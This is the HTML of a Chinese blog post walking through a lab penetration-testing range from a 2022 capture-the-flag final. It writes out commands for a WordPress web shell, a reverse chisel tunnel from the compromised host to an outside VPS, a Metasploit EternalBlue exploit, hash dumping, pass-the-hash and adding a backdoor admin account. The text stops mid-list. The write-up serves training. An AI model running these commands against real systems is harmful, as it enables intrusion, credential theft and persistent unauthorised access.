@@ -1,0 +1,573 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2022网鼎杯决赛内网靶场复现 | symv1a</title><meta name="author" content="symv1a,symv1a@163.com"><meta name="copyright" content="symv1a"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2022网鼎杯决赛内网靶场复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022网鼎杯决赛内网靶场复现">
+<meta property="og:url" content="https://symya.github.io/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html">
+<meta property="og:site_name" content="symv1a">
+<meta property="og:description" content="2022网鼎杯决赛内网靶场复现">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png">
+<meta property="article:published_time" content="2024-10-10T13:53:18.000Z">
+<meta property="article:modified_time" content="2024-11-10T20:55:39.000Z">
+<meta property="article:author" content="symv1a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2022网鼎杯决赛内网靶场复现",
+  "url": "https://symya.github.io/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html",
+  "image": "https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png",
+  "datePublished": "2024-10-10T13:53:18.000Z",
+  "dateModified": "2024-11-10T20:55:39.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "symv1a",
+      "url": "https://symya.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><link rel="canonical" href="https://symya.github.io/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2022网鼎杯决赛内网靶场复现',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" alt="Logo"><span class="site-name">symv1a</span></a><a class="nav-page-title" href="/"><span class="site-name">2022网鼎杯决赛内网靶场复现</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2022网鼎杯决赛内网靶场复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-10T13:53:18.000Z" title="Created 2024-10-10 13:53:18">2024-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-10T20:55:39.000Z" title="Updated 2024-11-10 20:55:39">2024-11-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>21mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:150,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2024-11-10 20:55:39&quot;}" hidden></div><h1 id="2022网鼎杯决赛内网靶场复现"><a href="#2022网鼎杯决赛内网靶场复现" class="headerlink" title="2022网鼎杯决赛内网靶场复现"></a>2022网鼎杯决赛内网靶场复现</h1><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><hr>
+<p>目录扫描工具[[dirsreach]]，[[gobuster]] , antsword，godzilla，[[fscan]]，[[WPScan]]，[[chisel]]，[[frp]]，[[Proxifier]] , [[msf]]，[[WMIexec]]，rdp是什么，[[CrackMapExec]]</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><hr>
+<p><strong>靶标介绍：</strong><br>该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。</p>
+<p><strong>考点：</strong></p>
+<ul>
+<li>wordpress插件rce</li>
+<li>MS17-010</li>
+<li>AS-REP Roasting</li>
+<li>基于资源的约束性委派</li>
+<li>智能卡身份验证出错下的CVE-2022–26923 AD域提权打法——Schannel传递证书传递到LDAPS，修改LDAP配置RBCD</li>
+</ul>
+<p>渗透的过程</p>
+<ol>
+<li>外网打点  -&gt; 拿到第一台机子的权限</li>
+<li>内网代理转发</li>
+<li>信息收集</li>
+<li>权限提升</li>
+<li>横向渗透</li>
+<li>权限维持</li>
+</ol>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><blockquote>
+<p>信息收集，外网打点</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python3 dirsearch.py -u 39.99.128.167 -e php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130552.png" alt="image.png"></p>
+<p>存在后台<code>/wp-admin，弱口令</code>​admin:123456&#96;登录<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130600.png" alt="image.png"><br>说弱口令可能有点抽象，这算是概率性事件，所以这里我们可以使用wpscan扫描工具对wp网站进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://www.example.com</span><br><span class="line"></span><br><span class="line">2、猜解后台用户名</span><br><span class="line">wpscan --url http://www.example.com --enumerate u</span><br><span class="line"></span><br><span class="line">3、使用字典暴破用户名admin的密码</span><br><span class="line">wpscan --url http://www.example.com -P password.txt -U admin </span><br></pre></td></tr></table></figure>
+
+<p>找功能点，找漏洞点，例如文件上传等<br>发现<code>theme file editor</code>​功能点，可以编辑<code>php</code>​文件，尝试修改该文件并提交。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130602.png" alt="image.png"></p>
+<p>开源框架，根据wordpress的命名特点找到绝对路径，发现恶意php代码被执行。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130605.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.1.72 --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>拿下一台主机</p>
+</blockquote>
+<p>写入一句话木马，godzilla连接，成功，在根目录下获取flag01<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130611.png" alt="image.png"></p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>查看内网网段<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130615.png" alt="image.png"></p>
+<p>传fscan，chisel，一个扫内网，一个搭隧道。</p>
+<h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/shadow1ng/fscan/releases/download/1.8.2/fscan_amd64 -O fscan1</span><br></pre></td></tr></table></figure>
+
+<p>如果sh: 1: .&#x2F;fscan: Text file busy,<br>发生此错误是因为当前文件已被占用，因此只要找出占用该文件的进程并杀死就可以了。<br>则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuser fscan</span><br><span class="line">kill -9 &lt;进程id&gt;</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># ./fscan -h 172.22.15.0/24</span><br><span class="line">(icmp) Target 172.22.15.13    is alive</span><br><span class="line">(icmp) Target 172.22.15.18    is alive</span><br><span class="line">(icmp) Target 172.22.15.24    is alive</span><br><span class="line">(icmp) Target 172.22.15.26    is alive</span><br><span class="line">(icmp) Target 172.22.15.35    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.15.13:88 open</span><br><span class="line">172.22.15.24:3306 open</span><br><span class="line">172.22.15.35:445 open</span><br><span class="line">172.22.15.24:445 open</span><br><span class="line">172.22.15.18:445 open</span><br><span class="line">172.22.15.13:445 open</span><br><span class="line">172.22.15.35:139 open</span><br><span class="line">172.22.15.24:139 open</span><br><span class="line">172.22.15.18:139 open</span><br><span class="line">172.22.15.35:135 open</span><br><span class="line">172.22.15.13:139 open</span><br><span class="line">172.22.15.13:135 open</span><br><span class="line">172.22.15.24:135 open</span><br><span class="line">172.22.15.18:135 open</span><br><span class="line">172.22.15.18:80 open</span><br><span class="line">172.22.15.24:80 open</span><br><span class="line">172.22.15.26:80 open</span><br><span class="line">172.22.15.26:22 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.18</span><br><span class="line">   [-&gt;]XR-CA</span><br><span class="line">   [-&gt;]172.22.15.18</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.13</span><br><span class="line">   [-&gt;]XR-DC01</span><br><span class="line">   [-&gt;]172.22.15.13</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.24</span><br><span class="line">   [-&gt;]XR-WIN08</span><br><span class="line">   [-&gt;]172.22.15.24</span><br><span class="line">[*] NetBios: 172.22.15.35    XIAORANG\XR-0687           </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.35</span><br><span class="line">   [-&gt;]XR-0687</span><br><span class="line">   [-&gt;]172.22.15.35</span><br><span class="line">[+] 172.22.15.24	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 172.22.15.13    [+]DC XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393 </span><br><span class="line">[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393 </span><br><span class="line">[*] NetBios: 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] 172.22.15.13  (Windows Server 2016 Standard 14393)</span><br><span class="line">[*] WebTitle: http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB</span><br><span class="line">[*] WebTitle: http://172.22.15.18       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle: http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www</span><br><span class="line">[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[*] WebTitle: http://172.22.15.24/www/sys/index.php code:200 len:135    title:None</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>5台主机存活（alive）</p>
+</li>
+<li><p>端口扫描</p>
+<ul>
+<li>88 通常与 Kerberos 验证协议相关</li>
+<li>3306 mysql</li>
+<li>445 SMB协议，用于文件共享，可能是一个Windows文件服务</li>
+<li>135端口(135端口是WMIC默认的管理端口)</li>
+<li>445端口(wimcexec使用445端口传回显) 即对方防火墙为关闭状态</li>
+<li>80</li>
+<li>22 ssh</li>
+</ul>
+</li>
+<li><p>主机的NetBIOS和NetInfo信息（机器的主机名和工作组）</p>
+</li>
+<li><p>ms17-10</p>
+</li>
+<li><p>poc-yaml-active-directory-certsrv-detect Active Directory证书服务</p>
+</li>
+</ul>
+<p>fscan的结果显然要打MS17-010,永恒之蓝</p>
+<blockquote>
+<p>永恒之蓝(ms17-010)过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+</blockquote>
+<p>附上一张网上的拓扑图<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130617.png" alt="image.png"></p>
+<h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>上传chisel，搭隧道</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz</span><br><span class="line">gzip -d </span><br></pre></td></tr></table></figure>
+
+<p>VPS上,server</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>172.22.15.26 机器上,client</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel client ip:1234 R:0.0.0.0:9383:socks</span><br><span class="line">./chisel client 156.246.88.98:1234 R:0.0.0.0:9383:socks</span><br></pre></td></tr></table></figure>
+
+<p>然后连接vps:9383的socks5代理<br>访问 <a target="_blank" rel="noopener" href="http://172.22.15.24/">http://172.22.15.24/</a>  成功<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130619.png" alt="image.png"></p>
+<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>kali，msf直接打。但是需要先在kali上也建立一下socks5访问，这样我们的脚本才能直接攻击内网服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130627.png"></p>
+<p>msf一把梭哈</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.15.24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>多打两次能成功。笔者大概跑了三回吧。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130632.png" alt="image.png"></p>
+<p>尝试直接获取可交互的shell，回显一直是timeout，遂尝试其他方法。<br>看到其他师傅的wp直接将flag down下来，但是笔者认为无法得知flag的绝对地址，遂不使用。<br>查看当前身份</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"># Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Windows系统中，SYSTEM用户是具有最高权限的用户账户，它拥有对系统的完全控制权。</p>
+</blockquote>
+<p>dump 哈希</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br></pre></td></tr></table></figure>
+
+<p>哈希传递，wmiexec连上去</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py administrator@172.22.15.24 -hashes :0e52d03e9b939997401466a0ec5a9cbc -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130636.png" alt="image.png"></p>
+<p>然后就是找flag，发现直接使用这个shell找，交互时间长且容易误触，导致需要从头来过，于是打算创建一个新用户，直接rdp连接。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user symya 123@asd /add</span><br><span class="line">net localgroup administrators symya /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130641.png" alt="image.png"></p>
+<p>**<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130644.png" alt="image.png"></p>
+<h3 id="rdp连接"><a href="#rdp连接" class="headerlink" title="rdp连接"></a>rdp连接</h3><p>win+r 然后mstsc，发现无法连接，后来才发现自己只做了浏览器的socks5代理，没有做全局代理。proxfier做全局代理<br>解决方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/juanjuan_01/article/details/127005255">https://blog.csdn.net/juanjuan_01&#x2F;article&#x2F;details&#x2F;127005255</a></p>
+<p>在机子中找到flag02</p>
+<p>在该机子中存在phpstudy，发现数据库账号密码<br>在phpstudy唯一一个网站的根目录底下发现名为phpmyadmin，直接登录。发现有个表有一堆域账户。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130645.png" alt="image.png"></p>
+<p>导出zdoosys_user.sql，改后缀改成txt然后把邮箱提取出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="comment"># 打开原始数据文件 </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;zdoosys_user.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file: </span><br><span class="line">	data = file.readlines() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取指定字符串 </span></span><br><span class="line">users = [] </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data: </span><br><span class="line">	<span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@xiaorang.lab&#x27;</span>, line) </span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">match</span>: </span><br><span class="line">		username = <span class="keyword">match</span>.group(<span class="number">1</span>) </span><br><span class="line">		users.append(username) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存提取后的字符串到 user.txt </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;email.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file: </span><br><span class="line">	<span class="keyword">for</span> user <span class="keyword">in</span> users: </span><br><span class="line">		file.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="弱口令接管OA"><a href="#弱口令接管OA" class="headerlink" title="弱口令接管OA"></a>弱口令接管OA</h3><p>机器为：172.22.15.24<br>代理出来后，访问，发现弱口令<code>admin:123456</code>​即可登录。<br>在团队，同事列表发现大量邮箱，可以做成email字典。和上方找到的类似。<br>​<img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130648.png" alt="image.png"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lixiuying@xiaorang.lab</span><br><span class="line">lixiaoliang@xiaorang.lab</span><br><span class="line">zhangyi@xiaorang.lab</span><br><span class="line">jiaxiaoliang@xiaorang.lab</span><br><span class="line">zhangli@xiaorang.lab</span><br><span class="line">zhangwei@xiaorang.lab</span><br><span class="line">liuqiang@xiaorang.lab</span><br><span class="line">wangfang@xiaorang.lab</span><br><span class="line">wangwei@xiaorang.lab</span><br><span class="line">wanglihong@xiaorang.lab</span><br><span class="line">huachunmei@xiaorang.lab</span><br><span class="line">wanghao@xiaorang.lab</span><br><span class="line">zhangxinyu@xiaorang.lab</span><br><span class="line">huzhigang@xiaorang.lab</span><br><span class="line">lihongxia@xiaorang.lab</span><br><span class="line">wangyulan@xiaorang.lab</span><br><span 